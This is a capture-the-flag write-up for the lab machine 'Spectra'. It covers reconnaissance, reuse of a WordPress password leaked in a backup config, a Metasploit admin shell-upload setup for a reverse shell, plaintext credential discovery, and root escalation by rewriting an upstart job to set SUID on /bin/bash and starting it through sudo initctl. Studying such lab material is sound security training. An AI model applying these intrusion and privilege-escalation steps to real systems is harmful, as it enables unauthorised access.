# Spectra - Writeup
## Initial Recon
Let's start with a nmap scan to extract the open ports

```
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-24 08:23 EDT
Nmap scan report for spectra.htb (10.10.10.229)
Host is up (0.13s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.1 (protocol 2.0)
| ssh-hostkey: 
|_  4096 52:47:de:5c:37:4f:29:0e:8e:1d:88:6e:f9:23:4d:5a (RSA)
80/tcp   open  http    nginx 1.17.4
|_http-server-header: nginx/1.17.4
|_http-title: Site doesn't have a title (text/html).
3306/tcp open  mysql   MySQL (unauthorized)
|_ssl-cert: ERROR: Script execution failed (use -d to debug)
|_ssl-date: ERROR: Script execution failed (use -d to debug)
|_sslv2: ERROR: Script execution failed (use -d to debug)
|_tls-alpn: ERROR: Script execution failed (use -d to debug)
|_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=4/24%OT=22%CT=1%CU=32437%PV=Y%DS=2%DC=T%G=Y%TM=60840E0
OS:A%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%TS=A)SEQ
OS:(SP=103%GCD=1%ISR=10D%TI=Z%CI=Z%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O
OS:3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=FE88%W2=
OS:FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M54DNNSN
OS:W7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%D
OS:F=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O
OS:=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W
OS:=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%R
OS:IPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops

TRACEROUTE (using port 1720/tcp)
HOP RTT       ADDRESS
1   126.43 ms 10.10.14.1
2   126.83 ms spectra.htb (10.10.10.229)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 59.62 seconds
```
nmap scan show that there is three ports open, 22 for ssh, 80 for http and 3306 for mysql.

## Website Enumeration

Open the following link in the browser : http://10.10.10.229

![alt text](https://pencer.io/assets/images/2021-03-21-16-46-59.png)

a simple page with two links, Software Issue Tracking and test.
The test link redirect us to http://10.10.10.229/testing/index.php, in this page we see an error database connection.
When we open http://10.10.10.229/testing, we see a wordpress projet, it's like a testing wordpress projet.
There is a file called wp-config.php.save, it's a configuration file in wordpress.
There is some credentials in this file, like ```define( 'DB_PASSWORD', 'devteam01' );```
Let's use this password to login in the the admin page of main website with username ```administrator```

ET VOILA, We're logged in as administrator. At this point we can either use Meterpreter to get a reverse shell, or we can change one of the template files from within the WordPress admin site and put our own reverse shell in it.

## Metasploit 
```
msf6>use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set rhost 10.10.10.229
rhost => 10.10.10.229
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lhost 10.10.14.76
lhost => 10.10.14.114
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set lport 1234
lport => 1234
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set username administrator
username => administrator
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set password devteam01
password => devteam01
msf6 exploit(unix/webapp/wp_admin_shell_upload) > set targeturi /main
targeturi => /main
```
### User Flag

Let’s check for users
```
nginx@spectra / $ cat /etc/passwd 
.
.
.
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
```

We another user in the passwd file called katie, let’s look at /home:
```
nginx@spectra / $ ls -l /home
total 20
drwxr-xr-x 20 chronos chronos 4096 Mar 21 14:53 chronos
drwxr-xr-x  4 katie   katie   4096 Mar 21 15:14 katie
drwxr-xr-x  5 nginx   nginx   4096 Mar 21 15:30 nginx
drwxr-x--t  4 root    root    4096 Jul 20  2020 root
drwxr-xr-x  4 root    root    4096 Jul 20  2020 user
```

So we need to find a way to move from our restricted nginx user to katie to get the flag.

Let's see what is inside the /opt folder
```
nginx@spectra ~ $ cd /opt
nginx@spectra /opt $ ls -l
total 36
drwxr-xr-x 2 root root 4096 Jun 28  2020 VirtualBox
-rw-r--r-- 1 root root  978 Feb  3 16:02 autologin.conf.orig
drwxr-xr-x 2 root root 4096 Jan 15 15:53 broadcom
drwxr-xr-x 2 root root 4096 Jan 15 15:54 displaylink
drwxr-xr-x 2 root root 4096 Jan 15 15:53 eeti
drwxr-xr-x 5 root root 4096 Jan 15 15:55 google
drwxr-xr-x 6 root root 4096 Feb  2 15:15 neverware
drwxr-xr-x 5 root root 4096 Jan 15 15:54 tpm1
drwxr-xr-x 5 root root 4096 Jan 15 15:54 tpm2
```

We see a file called autologin.conf.orig, which sounds very suspicious
```
bash-4.3# cat /opt/autologin.conf.orig 
# Copyright 2016 The Chromium OS Authors. All rights reserved.
# Use of this source code is governed by a BSD-style license that can be
# found in the LICENSE file.
description   "Automatic login at boot"
author        "chromium-os-dev@chromium.org"
# After boot-complete starts, the login prompt is visible and is accepting
# input.
start on started boot-complete
script
  passwd=
  # Read password from file. The file may optionally end with a newline.
  for dir in /mnt/stateful_partition/etc/autologin /etc/autologin; do
    if [ -e "${dir}/passwd" ]; then
      passwd="$(cat "${dir}/passwd")"
      break
    fi
  done
  if [ -z "${passwd}" ]; then
    exit 0
  fi
```

There's a line in there that points us to /etc/autologin. Let’s check that out:
```
scriptbash-4.3# cat /etc/autologin/passwd
SummerHereWeCome!!
```

Nice. We've found a password which presumably is for katie as that's the only other user on the box. Let's try SSH as we know that's open from our scan earlier.

The user falg is located at users.txt

## Root Flag
Ok, now we need to find a way to escalate. Let's see the all sudo permissions with the command :
```
katie@spectra ~ $ sudo -l
User katie may run the following commands on spectra:
    (ALL) SETENV: NOPASSWD: /sbin/initctl
```

```
initctl allows a system administrator to communicate and interact with the Upstart init(8) daemon.
init is the parent of all processes on the system, it is executed by the kernel and is responsible for starting all other processes.
```

So we can use initctl to control starting and stopping processes as system. Sounds like a nice simple way to get a root shell. First let’s see what’s /etc/init:
```
katie@spectra /etc/init $ ls -l
total 752
...
-rw-rw---- 1 root developers  478 Jun 29  2020 test.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test1.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test10.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test2.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test3.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test4.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test5.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test6.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test7.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test8.conf
-rw-rw---- 1 root developers  478 Jun 29  2020 test9.conf
```

Let’s check out the first test file:
```
katie@spectra /etc/init $ cat test.conf
description "Test node.js server"
author      "katie"
start on filesystem or runlevel [2345]
stop on shutdown
script
    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js
end script
pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script
pre-stop script
    rm /var/run/nodetest.pid
    echo
```

 We can replace the contents of this with our own code, let’s get it to change permissions on /bin/bash so we can run it with root permissions as katie.
```
katie@spectra /etc/init $ cat test.conf 
description "Test node.js server"
author      "katie"
start on filesystem or runlevel [2345]
stop on shutdown

script
chmod +s /bin/bash
end script
```

```
katie@spectra /etc/init $ sudo /sbin/initctl start test
test stop/waiting
```

```
katie@spectra /etc/init $ /bin/bash -p
bash-4.3# whoami
root
```
Grab the root flag and we are done:
```
cat root/root.txt
```

